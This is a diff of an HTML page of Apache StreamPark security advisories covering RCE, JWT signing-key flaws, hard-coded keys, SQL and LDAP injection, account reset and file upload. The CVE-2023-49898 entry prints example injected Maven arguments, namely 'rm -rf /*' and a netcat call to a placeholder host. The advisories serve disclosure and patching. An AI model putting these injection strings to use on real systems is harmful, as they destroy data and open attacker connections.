-<h2 id="CVE-2025-30001">Authenticated users can trigger remote command execution</h2>
-<p>CVE-2025-30001 <a href="./CVE-2025-30001.cve.json">[CVE json]</a> <a href="./CVE-2025-30001.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2025-10-10T09:52:24.458Z</em></p>
-<h3 id="affected-13">Affected</h3>
-<ul>
-<li>Apache StreamPark from 2.1.4 before 2.1.6</li>
-</ul>
-<h3 id="description-13">Description</h3>
-<p>Incorrect Execution-Assigned Permissions vulnerability in Apache StreamPark.</p><p>This issue affects Apache StreamPark: from 2.1.4 before 2.1.6.</p><p>Users are recommended to upgrade to version 2.1.6, which fixes the issue.</p>
-<h3 id="references-13">References</h3>
-<ul>
-<li><a href="https://lists.apache.org/thread/xfmsvhkcnr1831n0w5ovy3p44lsmfb7m">https://lists.apache.org/thread/xfmsvhkcnr1831n0w5ovy3p44lsmfb7m</a></li>
-</ul>
-<h3 id="credits-8">Credits</h3>
-<ul>
-<li>Liufeng Yi (<a href="mailto:ylf@yiliufeng.net">ylf@yiliufeng.net</a>) (reporter)</li>
-</ul>
-<h2 id="CVE-2025-53960">Uses the user’s password as the secret key</h2>
-<p>CVE-2025-53960 <a href="./CVE-2025-53960.cve.json">[CVE json]</a> <a href="./CVE-2025-53960.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2025-12-16T10:08:35.119Z</em></p>
-<h3 id="affected-14">Affected</h3>
-<ul>
-<li>Apache StreamPark from 2.0.0 before 2.1.7</li>
-</ul>
-<h3 id="description-14">Description</h3>
-<p></p><div><div><p>When issuing JSON Web Tokens (JWT), Apache StreamPark directly uses the user's password as the HMAC signing key (e.g., with the HS256 algorithm). An attacker can exploit this vulnerability to perform offline brute-force attacks on the user's password using a captured JWT, or to arbitrarily forge identity tokens for the user if the password is already known, ultimately leading to complete account takeover.<br><br></p></div></div>This issue affects Apache StreamPark: from 2.0.0 before 2.1.7.<p></p><p>Users are recommended to upgrade to version 2.1.7, which fixes the issue.</p>
-<h3 id="references-14">References</h3>
-<ul>
-<li><a href="https://lists.apache.org/thread/xlpvfzf5l5m5mfyjwrz5h4dssm3c32vy">https://lists.apache.org/thread/xlpvfzf5l5m5mfyjwrz5h4dssm3c32vy</a></li>
-</ul>
-<h3 id="credits-9">Credits</h3>
-<ul>
-<li>omkar parkhe <a href="mailto:omkarparth@gmail.com">omkarparth@gmail.com</a> (finder)</li>
-</ul>
-<h2 id="CVE-2025-54947">Use hard-coded key vulnerability</h2>
-<p>CVE-2025-54947 <a href="./CVE-2025-54947.cve.json">[CVE json]</a> <a href="./CVE-2025-54947.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2025-12-12T15:11:36.470Z</em></p>
-<h3 id="affected-15">Affected</h3>
-<ul>
-<li>Apache StreamPark from 2.0.0 before 2.1.7</li>
-</ul>
-<h3 id="description-15">Description</h3>
-<p>In Apache StreamPark versions 2.0.0 through 2.1.7, a security vulnerability involving a hard-coded encryption key exists. This vulnerability occurs because the system uses a fixed, immutable key for encryption instead of dynamically generating or securely configuring the key. Attackers may obtain this key through reverse engineering or code analysis, potentially decrypting sensitive data or forging encrypted information, leading to information disclosure or unauthorized system access.</p><p>This issue affects Apache StreamPark: from 2.0.0 before 2.1.7.</p><p>Users are recommended to upgrade to version 2.1.7, which fixes the issue.</p>
-<h3 id="references-15">References</h3>
-<ul>
-<li><a href="https://lists.apache.org/thread/kdntmzyzrco75x9q6mc6s8lty1fxmog1">https://lists.apache.org/thread/kdntmzyzrco75x9q6mc6s8lty1fxmog1</a></li>
+<li><a href="https://lists.apache.org/thread/pl6xgzoqrl4kcn0nt55zjbsx8dn80mkf">https://lists.apache.org/thread/pl6xgzoqrl4kcn0nt55zjbsx8dn80mkf</a></li>
 </ul>
 <h3 id="credits-10">Credits</h3>
 <ul>
-<li><a href="mailto:omkarparth@gmail.com">omkarparth@gmail.com</a> (finder)</li>
+<li>thiscodecc of MoyunSec Vlab and Bing (finder)</li>
 </ul>
-<h2 id="CVE-2025-54981">Weak Encryption Algorithm in StreamPark</h2>
-<p>CVE-2025-54981 <a href="./CVE-2025-54981.cve.json">[CVE json]</a> <a href="./CVE-2025-54981.osv.json">[OSV json]</a></p>
-<p><em>Last updated: 2025-12-12T15:10:32.960Z</em></p>
-<h3 id="affected-16">Affected</h3>
+<h2 id="CVE-2023-52290">Unchecked SQL query fields trigger SQL injection vulnerability</h2>
+<p>CVE-2023-52290 <a href="https://cve.org/CVERecord?id=CVE-2023-52290">[CVE]</a> <a href="./CVE-2023-52290.cve.json">[CVE json]</a> <a href="./CVE-2023-52290.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2024-07-16T07:37:36.828Z</em></p>
+<h3 id="affected-11">Affected</h3>
 <ul>
-<li>Apache StreamPark from 2.0.0 before 2.1.7</li>
+<li>Apache StreamPark (incubating) from 2.0.0 before 2.1.4</li>
 </ul>
-<h3 id="description-16">Description</h3>
-<p><span style="background-color: rgb(255, 255, 255);">Weak Encryption Algorithm in StreamPark,&nbsp;The use of an AES cipher in ECB mode and a weak random number generator for encrypting sensitive data, including JWT tokens, may have risked exposing sensitive authentication data<br></span><br>This issue affects Apache StreamPark: from 2.0.0 before 2.1.7.</p><p>Users are recommended to upgrade to version 2.1.7, which fixes the issue.</p>
-<h3 id="references-16">References</h3>
+<h3 id="description-11">Description</h3>
+<p><br>In streampark-console the list pages(e.g: application pages), users can sort page by field. This sort field is sent from the front-end to the back-end, and the SQL query is generated using this field. However, because this sort field isn&rsquo;t validated, there is a risk of SQL injection vulnerability. The attacker must successfully log into the system to launch an attack, which may cause data leakage. Since no data will be written, <span style="background-color: rgb(255, 255, 255);">so this is a low-impact vulnerability.</span><br><br><div><div>Mitigation:<br><br>all users should upgrade to 2.1.4,  Such parameters will be blocked.<br><br></div></div><br><br></p>
+<h3 id="references-11">References</h3>
 <ul>
-<li><a href="https://lists.apache.org/thread/9rbvdvwg5fdhzjdgyrholgso53r26998">https://lists.apache.org/thread/9rbvdvwg5fdhzjdgyrholgso53r26998</a></li>
+<li><a href="https://lists.apache.org/thread/t3mcm8pb65d9gj3wrgtj9sx9s2pfvvl3">https://lists.apache.org/thread/t3mcm8pb65d9gj3wrgtj9sx9s2pfvvl3</a></li>
 </ul>
 <h3 id="credits-11">Credits</h3>
 <ul>
-<li>omkar parkhe <a href="mailto:omkarparth@gmail.com">omkarparth@gmail.com</a> (finder)</li>
+<li>thiscodecc of MoyunSec Vlab and Bing (reporter)</li>
+</ul>
+<h2 id="CVE-2023-49898">Authenticated system users could trigger remote command execution</h2>
+<p>CVE-2023-49898 <a href="https://cve.org/CVERecord?id=CVE-2023-49898">[CVE]</a> <a href="./CVE-2023-49898.cve.json">[CVE json]</a> <a href="./CVE-2023-49898.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2023-12-15T12:13:22.953Z</em></p>
+<h3 id="affected-12">Affected</h3>
+<ul>
+<li>Apache StreamPark (incubating) from 2.0.0 before 2.1.2</li>
+</ul>
+<h3 id="description-12">Description</h3>
+<div>In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.<br><br><div>Mitigation:<br><br></div>all users&nbsp;<span style="background-color: var(--wht);">should upgrade to 2.1.2</span><div><br></div><br><div>Example:<br><br><div><p></p><div>##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &amp;&amp;, compilation failure use "||" or "&amp;&amp;":<br><br><span style="background-color: var(--wht);">/usr/share/java/maven-3/conf/settings.xml || rm -rf /*</span><br></div><p></p></div></div><div><div>/usr/share/java/maven-3/conf/settings.xml &amp;&amp; nohup nc x.x.x.x 8899 &amp;</div><br></div></div><p></p>
+<h3 id="references-12">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/qj99c03r4td35f8gbxq084b8qmv2fyr3">https://lists.apache.org/thread/qj99c03r4td35f8gbxq084b8qmv2fyr3</a></li>
+</ul>
+<h2 id="CVE-2023-30867">Authenticated system users could trigger SQL injection vulnerability</h2>
+<p>CVE-2023-30867 <a href="https://cve.org/CVERecord?id=CVE-2023-30867">[CVE]</a> <a href="./CVE-2023-30867.cve.json">[CVE json]</a> <a href="./CVE-2023-30867.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2023-12-15T12:13:59.544Z</em></p>
+<h3 id="affected-13">Affected</h3>
+<ul>
+<li>Apache StreamPark (incubating) from 2.0.0 before 2.1.2</li>
+</ul>
+<h3 id="description-13">Description</h3>
+<div><span style="background-color: var(--wht);">In the Streampark platform, when users log in to the system and use certain features, some pages provide a name-based fuzzy search, such as job names, role names, etc. The sql syntax :select * from table where jobName like '%jobName%'. However, the jobName field may receive illegal parameters, leading to SQL injection. This could potentially result in information leakage.</span><div><span style="background-color: var(--wht);"><br></span></div><br><div>Mitigation:</div><div><br></div><span style="background-color: rgb(255, 255, 255);">Users are recommended to upgrade to version 2.1.2, which fixes the issue.</span><br><br></div><br><p></p>
+<h3 id="references-13">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/bhdzh6hnh04yyf3g203bbyvxryd720o2">https://lists.apache.org/thread/bhdzh6hnh04yyf3g203bbyvxryd720o2</a></li>
+</ul>
+<h2 id="CVE-2022-46365">Logic error causing any account reset</h2>
+<p>CVE-2022-46365 <a href="https://cve.org/CVERecord?id=CVE-2022-46365">[CVE]</a> <a href="./CVE-2022-46365.cve.json">[CVE json]</a> <a href="./CVE-2022-46365.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2023-05-01T14:53:47.030Z</em></p>
+<h3 id="affected-14">Affected</h3>
+<ul>
+<li>Apache StreamPark (incubating) from 1.0.0 before 2.0.0</li>
+</ul>
+<h3 id="description-14">Description</h3>
+<p><span style="background-color: rgb(255, 255, 255);"><span style="background-color: rgb(255, 255, 255);"><div><div>Apache StreamPark 1.0.0 <span style="background-color: rgb(255, 255, 255);">before</span> 2.0.0 When the user successfully logs in, to modify his profile, the username will be passed to the server-layer as a parameter, but not verified whether the user name is the currently logged user and whether the user is legal, This will allow malicious attackers to send any username to modify and reset the account, <span style="background-color: rgb(255, 255, 255);">Users of the affected </span><span style="background-color: rgb(255, 255, 255);">versions should upgrade to Apache StreamPark 2.0.0 or later.</span></div></div></span></span><br></p>
+<h3 id="references-14">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/f68lcwrp8pcdc4yrbpcm8j7m0f5mjn7h">https://lists.apache.org/thread/f68lcwrp8pcdc4yrbpcm8j7m0f5mjn7h</a></li>
+</ul>
+<h2 id="CVE-2022-45802">Upload any file to any directory</h2>
+<p>CVE-2022-45802 <a href="https://cve.org/CVERecord?id=CVE-2022-45802">[CVE]</a> <a href="./CVE-2022-45802.cve.json">[CVE json]</a> <a href="./CVE-2022-45802.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2023-06-26T10:23:44.595Z</em></p>
+<h3 id="affected-15">Affected</h3>
+<ul>
+<li>Apache StreamPark (incubating) from 1.0.0 before 2.0.0</li>
+</ul>
+<h3 id="description-15">Description</h3>
+<div><div><span style="background-color: var(--wht);">Streampark allows any users to upload a jar as application, but there is no mandatory verification of the uploaded file type, causing users to upload some high-risk files, and may upload them to any directory,&nbsp;</span><span style="background-color: var(--wht);">Users of the affected versions should upgrade to Apache StreamPark 2.0.0 or later</span></div><br></div><br><br>
+<h3 id="references-15">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/thwl1v2h6r3c21x1qwff08o57qzjnst6">https://lists.apache.org/thread/thwl1v2h6r3c21x1qwff08o57qzjnst6</a></li>
+</ul>
+<h2 id="CVE-2022-45801">LDAP Injection Vulnerability</h2>
+<p>CVE-2022-45801 <a href="https://cve.org/CVERecord?id=CVE-2022-45801">[CVE]</a> <a href="./CVE-2022-45801.cve.json">[CVE json]</a> <a href="./CVE-2022-45801.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2023-05-01T14:50:06.013Z</em></p>
+<h3 id="affected-16">Affected</h3>
+<ul>
+<li>Apache StreamPark (incubating) from 1.0.0 before 2.0.0</li>
+</ul>
+<h3 id="description-16">Description</h3>
+<div><div><span style="background-color: rgb(255, 255, 255);">Apache StreamPark 1.0.0 to 2.0.0 have a LDAP injection vulnerability.</span><br><span style="background-color: rgb(255, 255, 255);">LDAP Injection is an attack used to exploit web based applications</span><br><span style="background-color: rgb(255, 255, 255);">that construct LDAP statements based on user input. When an</span><br><span style="background-color: rgb(255, 255, 255);">application fails to properly sanitize user input, it's possible to</span><br><span style="background-color: rgb(255, 255, 255);">modify LDAP statements through techniques similar to SQL Injection.</span><br><span style="background-color: rgb(255, 255, 255);">LDAP injection attacks could result in the granting of permissions to</span><br><span style="background-color: rgb(255, 255, 255);">unauthorized queries, and content modification inside the LDAP tree.</span><br><span style="background-color: rgb(255, 255, 255);">This risk may only occur when the user logs in with ldap, and the user</span><br><span style="background-color: rgb(255, 255, 255);">name and password login will not be affected, Users of the affected</span><br><span style="background-color: rgb(255, 255, 255);">versions should upgrade to Apache StreamPark 2.0.0 or later.</span><br><br></div></div><br>
+<h3 id="references-16">References</h3>
+<ul>
+<li><a href="https://lists.apache.org/thread/xbkwwpkp3n2rs2wcxg8l26mhsftxwwr9">https://lists.apache.org/thread/xbkwwpkp3n2rs2wcxg8l26mhsftxwwr9</a></li>
 </ul>
 
   
